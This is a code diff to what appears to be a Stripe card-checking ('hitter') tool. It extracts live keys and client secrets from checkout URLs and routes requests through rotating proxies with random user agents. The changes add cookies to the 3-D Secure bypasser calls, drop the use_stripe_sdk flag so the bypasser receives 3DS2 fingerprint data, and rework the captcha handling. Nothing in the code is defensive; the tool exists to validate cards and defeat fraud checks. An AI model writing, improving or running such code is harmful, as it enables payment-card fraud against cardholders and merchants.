@@ -14,6 +14,7 @@ import math
 import numpy as np
 from scipy.interpolate import interp1d
 from gateways.stripe.stripe_3ds_bypasser import Stripe3DSBypasser
+from gateways.stripe.stripe_fid import decode_fragment
 
 load_dotenv()
 
@@ -90,7 +91,7 @@ class StripeAPIExtractor:
             headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
             if stripe_account:
                 headers["Stripe-Account"] = stripe_account
-            data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "America/New_York", "redirect_type": "url"}
+            data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "-300", "redirect_type": "url"}
             proxy_data = await ProxyManager.get_random(user_id)
             proxies = None
             if proxy_data:
@@ -1449,7 +1450,9 @@ class StripeAPIHitter:
                     confirm_data = {
                         "payment_method": pm_id,
                         "expected_payment_method_type": "card",
-                        "use_stripe_sdk": "false",
+                        # use_stripe_sdk omitted — Stripe defaults to SDK mode, returning
+                        # three_d_secure_2_source + fingerprint shapes the bypasser needs.
+                        # Sending false here gives redirect_to_url blobs only.
                         "return_url": checkout_page_url,
                         "key": self.pk_live,
                         "client_secret": self.cs_live
@@ -1467,7 +1470,7 @@ class StripeAPIHitter:
                     confirm_data = {
                         "payment_method": pm_id,
                         "expected_payment_method_type": "card",
-                        "use_stripe_sdk": "false",
+                        # use_stripe_sdk omitted — same reason as PI path above
                         "return_url": checkout_page_url,
                         "key": self.pk_live,
                         "client_secret": self.cs_live
@@ -1689,7 +1692,7 @@ class StripeAPIHitter:
                         # Inject pi-confirm-specific fields if routing to direct intent endpoint
                         if _hitchk_pi and _hitchk_cs and _hitchk_confirm_url != confirm_url:
                             _att_data["client_secret"] = _hitchk_cs
-                            _att_data["use_stripe_sdk"] = "false"
+                            # use_stripe_sdk omitted — SDK mode returns proper 3DS2 shapes
                             _att_data["return_url"] = checkout_page_url
                             for _rm in ["init_checksum", "consent[terms_of_service]",
                                         "client_attribution_metadata[client_session_id]",
@@ -2132,10 +2135,17 @@ class StripeAPIHitter:
                                                 result['captcha_bypassed'] = True
                                                 result['raw_response'] = _verify_json
                                                 try:
+                                                    _hitter_cookies = {}
+                                                    if '_cffi_session' in locals() and hasattr(_cffi_session, 'cookies'):
+                                                        try:
+                                                            _hitter_cookies = dict(_cffi_session.cookies)
+                                                        except Exception:
+                                                            pass
                                                     bypasser_res = await Stripe3DSBypasser.resolve_3ds(
                                                         result,
                                                         proxy_data=self.proxy_data,
                                                         profile=profile,
+                                                        cookies=_hitter_cookies,
                                                     )
                                                     if bypasser_res and bypasser_res.get('success'):
                                                         return bypasser_res
@@ -2184,21 +2194,10 @@ class StripeAPIHitter:
 
                                 # Execute app (3).py secondary PI/SETI confirm with client_secret on all requires_action responses
                                 if pi and client_secret:
-                                    # Attempt captcha solve if we have rqdata
-                                    _hcaptcha_token = None
-                                    if _top_rqdata:
-                                        try:
-                                            from gateways.stripe.stripe_captcha_bypasser import StripeCaptchaBypasser as _SCB
-                                            _hcaptcha_token = await asyncio.get_event_loop().run_in_executor(
-                                                None, lambda: _SCB._solve_hcaptcha_sync(
-                                                    _top_sitekey or "4c787647-7985-4804-b8e9-f431dd3031d7",
-                                                    _top_rqdata,
-                                                    proxy_data=self.proxy_data
-                                                ) if hasattr(_SCB, '_solve_hcaptcha_sync') else None
-                                            )
-                                        except Exception:
-                                            pass
-                                    print(f"[DEBUG CAPTCHA] triggered=True rqdata={bool(_top_rqdata)} token={bool(_hcaptcha_token)}")
+                                    # _hcaptcha_token was resolved by NopeCHA in the WAF gate block above (if triggered).
+                                    # StripeCaptchaBypasser._solve_hcaptcha_sync does not exist — removed dead call.
+                                    _hcaptcha_token = _hcaptcha_token if '_hcaptcha_token' in locals() else None
+                                    print(f"[DEBUG CAPTCHA] triggered={captcha_triggered} rqdata={bool(_top_rqdata)} token={bool(_hcaptcha_token)}")
                                     try:
                                         # Once initial confirm mints a PaymentIntent, reconfirm MUST target /v1/payment_intents/{pi}/confirm with client_secret
                                         _is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
@@ -2224,7 +2223,7 @@ class StripeAPIHitter:
                                             "payment_method": pm_id,
                                             "expected_payment_method_type": "card",
                                             "payment_method_options[card][request_three_d_secure]": "automatic",
-                                            "use_stripe_sdk": "false",
+                                            # use_stripe_sdk omitted — SDK mode returns 3DS2 shapes
                                             "key": self.pk_live,
                                         }
                                         if client_secret:
@@ -2479,7 +2478,7 @@ class StripeAPIHitter:
                                                 "payment_method": pm_id,
                                                 "expected_payment_method_type": "card",
                                                 "payment_method_options[card][mit_exemption][reason]": "low_value",
-                                                "use_stripe_sdk": "false",
+                                                # use_stripe_sdk omitted — SDK mode surfaces 3DS2 shapes
                                                 "key": self.pk_live,
                                                 "client_secret": client_secret
                                             }
@@ -2548,10 +2547,17 @@ class StripeAPIHitter:
                                     # Fires when the exemption sweep above still couldn't resolve —
                                     # passes the full raw_response into the ACS/redirect resolver.
                                     try:
+                                        _hitter_cookies_st3 = {}
+                                        if '_cffi_session' in locals() and hasattr(_cffi_session, 'cookies'):
+                                            try:
+                                                _hitter_cookies_st3 = dict(_cffi_session.cookies)
+                                            except Exception:
+                                                pass
                                         _bypass_result = await Stripe3DSBypasser.resolve_3ds(
                                             result=result,
                                             proxy_data=proxy_data,
-                                            profile=profile
+                                            profile=profile,
+                                            cookies=_hitter_cookies_st3,
                                         )
                                         if _bypass_result.get('3ds_bypassed') or _bypass_result.get('success'):
                                             return _bypass_result
@@ -2658,21 +2664,15 @@ class ConcurrentHitter:
                     cs_token = StripeAPIExtractor.extract_cs_live(final_url, html)
                     pk_key = None
 
-                    # Try hash fragment decode first
+                    # Try hash fragment decode first — decode_fragment handles all fid variants
                     check_url = final_url if '#' in final_url else self.url
-                    hash_idx = check_url.find('#')
-                    if hash_idx != -1:
-                        import urllib.parse, base64, json as _json
-                        decoded = urllib.parse.unquote(check_url[hash_idx+1:])
-                        try:
-                            raw_bytes = base64.b64decode(decoded + '==')
-                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
-                            data = _json.loads(json_str)
-                            hash_pk = data.get('apiKey')
-                            # Only trust if it's a live key — pk_test_ causes requires_action loop on live sessions
-                            if hash_pk and hash_pk.startswith('pk_live_'):
-                                pk_key = hash_pk
-                        except: pass
+                    try:
+                        _fid_data = decode_fragment(check_url)
+                        hash_pk = _fid_data.get('apiKey')
+                        if hash_pk and hash_pk.startswith('pk_live_'):
+                            pk_key = hash_pk
+                    except Exception:
+                        pass
                     if not pk_key:
                         pk_key = StripeAPIExtractor.extract_pk_live(html)
                     
@@ -2711,18 +2711,13 @@ class ConcurrentHitter:
         cs_token = StripeAPIExtractor.extract_cs_live(self.url, "")
         pk_key = None
         stripe_account = None
-        hash_idx = self.url.find('#')
-        if hash_idx != -1:
-            import urllib.parse, base64, json
-            hash_str = self.url[hash_idx+1:]
-            decoded = urllib.parse.unquote(hash_str)
-            try:
-                raw_bytes = base64.b64decode(decoded + '==')
-                json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
-                data = json.loads(json_str)
-                pk_key = data.get('apiKey')
-                stripe_account = data.get('stripeAccount')
-            except: pass
+        # decode_fragment handles #fid, %23fid, cs_..._secret_fid... and URL-encoded variants
+        try:
+            _fid_data = decode_fragment(self.url)
+            pk_key = _fid_data.get('apiKey') or pk_key
+            stripe_account = _fid_data.get('stripeAccount') or stripe_account
+        except Exception:
+            pass
 
         if cs_token and pk_key:
             # Only trust hash pk if it is actually a live key — hash can carry pk_test_ which silently
